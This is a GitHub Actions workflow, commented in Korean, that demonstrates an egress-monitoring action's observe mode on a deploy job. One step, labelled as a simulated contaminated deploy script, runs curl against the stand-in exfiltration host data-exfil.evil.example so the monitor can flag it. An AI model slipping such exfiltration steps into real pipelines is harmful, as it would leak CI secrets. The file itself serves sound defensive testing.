# just-shield 관찰 모드 데모 (v2, 층 ⓒ).
# deploy 잡이 실행 중 어디와 통신하는지 관찰하고 egress.lock과 대조한다.
# 잡 시작 시 관찰이 켜지고(한 블록), 잡 끝에 보고가 자동 실행된다(post 훅).
# 미등재 목적지와 통신하면 🔴 — 시크릿 유출을 몇 분 안에 발각한다.
name: egress
on:
  push:
    branches: [main]
  pull_request:
permissions:
  contents: read
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@df4cb1c069e1874edd31b4311f1884172cec0e10 # v6
      - uses: kihyun1998/just-shield@60bbb48d88ef65b02848146981c30dfaa09ecbc9 # v0.2.0 + 관찰자 스텝 생존 수정
        with:
          mode: observe
      - name: 정상 배포 (egress.lock에 등재된 곳만 통신)
        run: curl -sS https://example.com > /dev/null || true
      # ⚠️ 데모: 오염된 배포 스크립트가 시크릿을 외부로 빼돌리는 상황 시뮬레이션.
      # 이 도메인은 egress.lock [deploy]에 없으므로 observe가 잡 끝에 🔴로 잡는다.
      - name: 오염된 스텝 (시크릿 유출 시도)
        run: curl -sS https://data-exfil.evil.example > /dev/null || true
